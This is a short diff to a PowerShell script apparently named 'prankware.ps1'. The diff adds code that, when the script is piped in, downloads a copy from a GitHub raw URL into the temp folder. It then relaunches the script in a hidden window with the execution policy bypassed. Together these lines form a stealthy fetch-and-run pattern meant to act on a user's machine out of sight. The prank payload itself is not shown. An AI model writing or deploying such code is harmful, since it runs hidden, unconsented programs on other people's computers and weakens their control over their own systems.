@@ -1,8 +1,19 @@
 if (-not $env:PS_RUN_HIDDEN) {
     $env:PS_RUN_HIDDEN = "1"
+
+    if (-not $MyInvocation.MyCommand.Path) {
+        # Script was run via pipeline, write to temp file
+        $tempPath = "$env:TEMP\prankware.ps1"
+        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xtofuub/PrankWare/main/prankware.ps1' -UseBasicParsing -OutFile $tempPath
+        $scriptPath = $tempPath
+    } else {
+        # Script was run from file
+        $scriptPath = $MyInvocation.MyCommand.Path
+    }
+
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = "powershell.exe"
-    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$PSCommandPath`""
+    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
     $psi.WindowStyle = 'Hidden'
     $psi.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
